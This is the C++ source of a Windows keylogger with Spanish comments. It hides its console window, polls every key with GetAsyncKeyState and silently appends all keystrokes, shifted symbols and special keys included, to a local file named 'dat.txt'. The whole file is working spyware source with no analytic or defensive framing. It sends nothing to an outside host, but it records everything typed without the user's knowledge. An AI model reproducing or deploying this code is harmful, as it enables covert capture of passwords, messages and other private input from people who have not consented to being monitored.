#include <Windows.h>
#include <string>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

//Donde se guarda los inputs
void LOG(string input) {
	fstream LogFile; //Crea el archivo
	LogFile.open("dat.txt", fstream::app); //Abre el archivo
	if (LogFile.is_open()) {
		LogFile << input; //Escribe el input
		LogFile.close(); //Cierra el stream
	}
}
//Registrar Teclas especiales
bool SpecialKeys(int S_Key) {
	switch (S_Key) {
		case VK_BACK:
			LOG("[BACKSPACE]");
			return true;
		case VK_TAB:
			LOG("[TAB]");
			return true;
		case VK_RETURN:
			LOG("\n");
			return true;
		case VK_SHIFT:
			LOG("[SHIFT]");
			return true;
		case VK_CONTROL:
			LOG("[CONTROL]");
			return true;
		case VK_MENU:
			LOG("[ALT]");
			return true;
		case VK_CAPITAL:
			LOG("[CAPS_LCOK]");
			return true;
		case VK_SPACE:
			LOG(" ");
			return true;
		case VK_LEFT:
			LOG("[LEFT_ARROW_KEY]");
			return true;
		case VK_UP:
			LOG("[UP_ARROW_KEY]");
			return true;
		case VK_RIGHT:
			LOG("[RIGHT_ARROW_KEY]");
			return true;
		case VK_DOWN:
			LOG("[DOWN_ARROW_KEY]");
			return true;
		case VK_ESCAPE:
			LOG("[ESCAPE]");
			return true;
		case VK_NUMPAD0:
			LOG("0");
			return true;
		case VK_NUMPAD1:
			LOG("1");
			return true;
		case VK_NUMPAD2:
			LOG("2");
			return true;
		case VK_NUMPAD3:
			LOG("3");
			return true;
		case VK_NUMPAD4:
			LOG("4");
			return true;
		case VK_NUMPAD5:
			LOG("5");
			return true;
		case VK_NUMPAD6:
			LOG("6");
			return true;
		case VK_NUMPAD7:
			LOG("7");
			return true;
		case VK_NUMPAD8:
			LOG("8");
			return true;
		case VK_NUMPAD9:
			LOG("9");
			return true;
		case VK_MULTIPLY:
			LOG("*");
			return true;
		case VK_ADD:
			LOG("+");
			return true;
		case VK_SUBTRACT:
			LOG("-");
			return true;
		case VK_DECIMAL:
			LOG(".");
			return true;
		case VK_DIVIDE:
			LOG("/");
			return true;
		case 48:
			if (GetAsyncKeyState(0x10)) {
				LOG(")");
			}else {
				LOG("0");
			}
			return true;
		case 49:
			if (GetAsyncKeyState(0x10)) {
				LOG("!");
			}else {
				LOG("1");
			}
			return true;
		case 50:
			if (GetAsyncKeyState(0x10)) {
				LOG("@");
			}
			else {
				LOG("2");
			}
			return true;
		case 51:
			if (GetAsyncKeyState(0x10)) {
				LOG("#");
			}
			else {
				LOG("3");
			}
			return true;
		case 52:
			if (GetAsyncKeyState(0x10)) {
				LOG("$");
			}
			else {
				LOG("4");
			}
			return true;
		case 53:
			if (GetAsyncKeyState(0x10)) {
				LOG("%");
			}
			else {
				LOG("5");
			}
			return true;
		case 54:
			if (GetAsyncKeyState(0x10)) {
				LOG("^");
			}
			else {
				LOG("6");
			}
			return true;
		case 55:
			if (GetAsyncKeyState(0x10)) {
				LOG("&");
			}
			else {
				LOG("7");
			}
			return true;
		case 56:
			if (GetAsyncKeyState(0x10)) {
				LOG("*");
			}
			else {
				LOG("8");
			}
			return true;
		case 57:
			if (GetAsyncKeyState(0x10)) {
				LOG("(");
			}
			else {
				LOG("9");
			}
			return true;
		default:
			return false;
	}
}

bool isCapsLock() { // Revisar si el CapsLock esta activo o no
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
		return true;
	} 
	else {
		return false;
	}
}

bool isShift() {  // Revisar si shift esta siendo pulsado
	if ((GetKeyState(VK_SHIFT) & 0x8000) != 0) {
		return true;
	}
	else {
		return false;
	}
}

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE); //Esconder la consola
	int KEY;
	while (true) {
		Sleep(15); //Ahorra recursos en la memoria
		for (KEY = 8; KEY <= 127; KEY++) { //Ver que numero ascii es
			if (GetAsyncKeyState(KEY) == -32767) { //Verifica si una tecla es pulsada o no
				if (SpecialKeys(KEY) == false) {
					if (!(isShift() ^ isCapsLock())) { //Para letras minusculas
						KEY = KEY + 32;
						fstream LogFile;
						LogFile.open("dat.txt", fstream::app);
						if (LogFile.is_open()) {
							LogFile << char(KEY);
							LogFile.close();
						}
						break;
					}
					else { //Para las letras mayusculas
						fstream LogFile;
						LogFile.open("dat.txt", fstream::app);
						if (LogFile.is_open()) {
							LogFile << char(KEY);
							LogFile.close();
						}
					}
				}
			}
		}
	}
	return 0;
}